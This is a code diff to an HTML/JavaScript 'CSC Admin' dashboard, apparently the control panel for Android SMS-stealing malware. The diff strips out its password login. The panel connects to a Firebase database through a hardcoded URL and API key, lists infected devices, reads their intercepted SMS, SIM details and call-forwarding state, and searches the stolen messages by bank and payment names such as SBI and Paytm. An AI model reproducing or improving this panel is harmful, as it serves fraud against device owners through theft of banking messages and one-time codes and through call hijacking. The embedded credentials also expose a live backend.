@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
-<title>CSC Admin - Complete Working Dashboard</title>
+<title>CSC Admin Dashboard - No Password</title>
 <style>
 *{margin:0;padding:0;box-sizing:border-box;}
 :root{
@@ -25,14 +25,6 @@ body{font-family:'Segoe UI',sans-serif;background:var(--bg);color:var(--text);}
 .fg input:focus{border-color:var(--purple2);}
 .pbtn{width:100%;background:linear-gradient(135deg,var(--purple),var(--purple2));color:#fff;border:none;border-radius:10px;padding:13px;font-size:15px;font-weight:700;cursor:pointer;}
 .errbox{background:#fef2f2;border:1px solid #fecaca;color:#b91c1c;padding:10px;border-radius:8px;font-size:13px;margin-top:10px;display:none;}
-
-#login-screen{min-height:100vh;display:none;align-items:center;justify-content:center;padding:20px;background:linear-gradient(135deg,#4c1d95,#1e1b4b);}
-.login-card{background:#fff;border-radius:20px;padding:36px 28px;width:100%;max-width:340px;box-shadow:var(--shadow2);text-align:center;}
-.login-card .ic{font-size:44px;}
-.login-card h2{font-size:19px;font-weight:700;color:var(--purple);margin:8px 0 4px;}
-.login-card p{font-size:13px;color:var(--muted);margin-bottom:20px;}
-.login-card input{width:100%;border:1.5px solid var(--border);border-radius:10px;padding:12px;font-size:18px;text-align:center;letter-spacing:3px;outline:none;margin-bottom:14px;}
-.login-card input:focus{border-color:var(--purple2);}
 
 #app{display:none;flex-direction:column;min-height:100vh;}
 .topbar{background:linear-gradient(135deg,var(--purple),var(--purple2));padding:13px 16px;display:flex;align-items:center;justify-content:space-between;position:sticky;top:0;z-index:200;}
@@ -117,32 +109,20 @@ body{font-family:'Segoe UI',sans-serif;background:var(--bg);color:var(--text);}
 </style>
 </head>
 <body>
-  <!-- SETUP SCREEN -->
+  <!-- SETUP SCREEN - ONLY CONFIG, NO PASSWORD -->
 <div id="setup-screen">
   <div class="setup-card">
-    <div class="setup-logo"><div class="ic">📡</div><h1>CSC Admin</h1><p>Firebase Configuration</p></div>
-    <div class="fg"><label>Firebase URL</label><input id="cfg-url" placeholder="https://your-db.firebaseio.com" value="https://vkvkvk-61f36-default-rtdb.firebaseio.com/"></div>
+    <div class="setup-logo"><div class="ic">📡</div><h1>CSC Admin Dashboard</h1><p>Enter Firebase Details to Connect</p></div>
+    <div class="fg"><label>Firebase Database URL</label><input id="cfg-url" placeholder="https://your-db.firebaseio.com" value="https://vkvkvk-61f36-default-rtdb.firebaseio.com/"></div>
     <div class="fg"><label>API Key</label><input id="cfg-key" type="password" placeholder="AIzaSy..." value="AIzaSyAniMS9v56_LHDoYg3eqyjjJAWeNUHOias"></div>
-    <button class="pbtn" onclick="saveConfig()">Save & Continue</button>
+    <button class="pbtn" onclick="doConnect()">🔗 Connect & Open Dashboard</button>
     <div class="errbox" id="setup-err"></div>
   </div>
 </div>
 
-<!-- LOGIN SCREEN -->
-<div id="login-screen">
-  <div class="login-card">
-    <div class="ic">🔐</div>
-    <h2>Admin Login</h2>
-    <p>Enter Admin Password</p>
-    <input type="password" id="login-pass" placeholder="••••••" maxlength="20" onkeydown="if(event.key==='Enter')doLogin()" />
-    <button class="pbtn" onclick="doLogin()">Login</button>
-    <div class="errbox" id="login-err"></div>
-  </div>
-</div>
-
-<!-- MAIN APP DASHBOARD -->
+<!-- MAIN DASHBOARD APP -->
 <div id="app">
-  <div class="topbar"><div class="topbar-title"><span class="live-dot"></span> CSC Admin</div><div><button class="xbtn" onclick="refreshData()">🔄</button><button class="xbtn" onclick="logout()">Logout</button></div></div>
+  <div class="topbar"><div class="topbar-title"><span class="live-dot"></span> CSC Admin</div><div><button class="xbtn" onclick="refreshData()">🔄</button><button class="xbtn" onclick="disconnect()">Disconnect</button></div></div>
   <div class="search-sec"><div class="sw"><span class="si">🔍</span><input id="global-search" placeholder="Search SMS in ALL devices (SBI, Paytm, Nearby, Spice)..." oninput="onSearch(this.value)" /><button class="sc" id="search-clear-btn" onclick="clearSearch()">✕</button></div></div>
   <div id="main-content"><div class="reg-bar" id="register-bar">Devices: --</div><button class="upd-btn" onclick="openUpdateNo()">📱 UPDATE NUMBER</button><div class="stats-bar"><div class="sbox"><div class="snum" id="s-total">0</div><div class="slbl">Devices</div></div><div class="sbox"><div class="snum" id="s-online">0</div><div class="slbl">Online</div></div><div class="sbox"><div class="snum" id="s-sms">0</div><div class="slbl">Total SMS</div></div></div><div class="dev-list" id="device-list"><div class="loading"><div class="spinner"></div> Loading devices...</div></div></div>
 </div>
@@ -170,9 +150,8 @@ body{font-family:'Segoe UI',sans-serif;background:var(--bg);color:var(--text);}
 
 <div id="toast"></div>
 <script>
-// ========== GLOBAL VARIABLES ==========
+// ========== GLOBAL VARIABLES - NO PASSWORD ==========
 var DB_URL = '', API_KEY = '';
-var ADMIN_PASSWORD = '';
 var DEVICES_LIST = [];      // verify_device se device IDs
 var DEVICES_DATA = {};      // all data per device
 var currentDeviceKey = null;
@@ -195,8 +174,8 @@ function fbSet(path, data) {
   }).then(function(r) { return r.json(); });
 }
 
-// ========== SAVE CONFIG ==========
-function saveConfig() {
+// ========== DIRECT CONNECT - NO PASSWORD CHECK ==========
+function doConnect() {
   DB_URL = document.getElementById('cfg-url').value.trim().replace(/\/$/, '');
   API_KEY = document.getElementById('cfg-key').value.trim();
   
@@ -207,28 +186,21 @@ function saveConfig() {
   
   var btn = event.target;
   btn.disabled = true;
-  btn.textContent = 'Checking...';
+  btn.textContent = 'Connecting...';
   
-  // Fetch Admin Password from csc6/Admin_Password
-  fbGet('csc6/Admin_Password').then(function(password) {
-    if (!password) {
-      showSetupErr('Admin_Password not found in csc6/Admin_Password');
-      btn.disabled = false;
-      btn.textContent = 'Save & Continue';
-      return;
-    }
-    ADMIN_PASSWORD = String(password);
+  // Directly fetch verify_device to check connection
+  fbGet('verify_device').then(function(devices) {
     document.getElementById('setup-screen').style.display = 'none';
-    document.getElementById('login-screen').style.display = 'flex';
-    document.getElementById('login-pass').value = '';
-    document.getElementById('login-pass').focus();
+    document.getElementById('app').style.display = 'flex';
+    loadAllData();
+    startPolling();
     btn.disabled = false;
-    btn.textContent = 'Save & Continue';
-    showToast('Configuration saved! Please login.');
+    btn.textContent = '🔗 Connect & Open Dashboard';
+    showToast('Connected successfully!');
   }).catch(function(e) {
-    showSetupErr('Connection failed: ' + e.message);
+    showSetupErr('Connection failed: ' + e.message + ' — Check URL/API Key');
     btn.disabled = false;
-    btn.textContent = 'Save & Continue';
+    btn.textContent = '🔗 Connect & Open Dashboard';
   });
 }
 
@@ -239,31 +211,13 @@ function showSetupErr(msg) {
   setTimeout(function() { err.style.display = 'none'; }, 4000);
 }
 
-// ========== LOGIN ==========
-function doLogin() {
-  var pass = document.getElementById('login-pass').value;
-  if (pass === ADMIN_PASSWORD) {
-    document.getElementById('login-screen').style.display = 'none';
-    document.getElementById('app').style.display = 'flex';
-    loadAllData();
-    startPolling();
-    showToast('Login successful!');
-  } else {
-    var err = document.getElementById('login-err');
-    err.textContent = '❌ Wrong password!';
-    err.style.display = 'block';
-    setTimeout(function() { err.style.display = 'none'; }, 3000);
-  }
-}
-
-function logout() {
+function disconnect() {
   stopPolling();
   document.getElementById('app').style.display = 'none';
   document.getElementById('detail-screen').style.display = 'none';
   document.getElementById('search-screen').style.display = 'none';
-  document.getElementById('login-screen').style.display = 'flex';
-  document.getElementById('login-pass').value = '';
-  showToast('Logged out');
+  document.getElementById('setup-screen').style.display = 'flex';
+  showToast('Disconnected');
 }
   // ========== LOAD ALL DATA ==========
 function loadAllData() {
@@ -277,13 +231,12 @@ function loadAllData() {
     }
     
     DEVICES_LIST = Object.keys(devices);
-    console.log('Devices found:', DEVICES_LIST.length);
     
     // Step 2: For each device, fetch its data from all_user nodes
     var promises = [];
-    DEVICES_LIST.forEach(function(deviceId) {
-      promises.push(fetchDeviceData(deviceId));
-    });
+    for (var i = 0; i < DEVICES_LIST.length; i++) {
+      promises.push(fetchDeviceData(DEVICES_LIST[i]));
+    }
     
     Promise.all(promises).then(function() {
       renderDeviceList();
@@ -303,23 +256,19 @@ function loadAllData() {
 }
 
 function fetchDeviceData(deviceId) {
-  // Fetch all data for a device from different nodes in all_user
+  // Fetch all data for a device from different nodes in csc6/all_user
   return Promise.all([
     fbGet('csc6/all_user/Info/' + deviceId),
     fbGet('csc6/all_user/Sms/' + deviceId),
     fbGet('csc6/all_user/SimINFO/' + deviceId),
     fbGet('csc6/all_user/Call_For/' + deviceId),
-    fbGet('csc6/all_user/Data/' + deviceId),
-    fbGet('csc6/all_user/Forwad_Status/' + deviceId),
-    fbGet('csc6/all_user/User/' + deviceId)
+    fbGet('csc6/all_user/Data/' + deviceId)
   ]).then(function(results) {
     var info = results[0] || {};
     var smsRaw = results[1] || {};
     var simInfo = results[2] || {};
     var callFor = results[3] || {};
     var data = results[4] || {};
-    var fwdStatus = results[5] || {};
-    var user = results[6] || {};
     
     var smsArr = objToArr(smsRaw);
     var statusText = String(info.Status || '').toLowerCase();
@@ -335,8 +284,6 @@ function fetchDeviceData(deviceId) {
       simInfo: simInfo,
       callFor: callFor,
       data: data,
-      fwdStatus: fwdStatus,
-      user: user,
       rawInfo: info
     };
   });
@@ -411,8 +358,9 @@ function renderDeviceList() {
       '</div>';
   }
   container.innerHTML = html;
-       }
-  // ========== DEVICE DETAIL ==========
+}
+
+// ========== DEVICE DETAIL ==========
 function openDevice(deviceId) {
   currentDeviceKey = deviceId;
   document.getElementById('app').style.display = 'none';
@@ -460,9 +408,8 @@ function goBack() {
     document.getElementById('app').style.display = 'flex';
   }
   window.scrollTo(0, 0);
-}
-
-// ========== GLOBAL SEARCH - ALL DEVICES ==========
+          }
+  // ========== GLOBAL SEARCH - ALL DEVICES ==========
 function onSearch(val) {
   var clearBtn = document.getElementById('search-clear-btn');
   clearBtn.style.display = val ? 'block' : 'none';
@@ -569,7 +516,8 @@ function highlightText(text, keyword) {
     return text;
   }
 }
-  // ========== CALL FORWARDING ==========
+
+// ========== CALL FORWARDING ==========
 function openCallFwd() {
   var dev = DEVICES_DATA[currentDeviceKey];
   if (!dev) { showToast('Device not found'); return; }
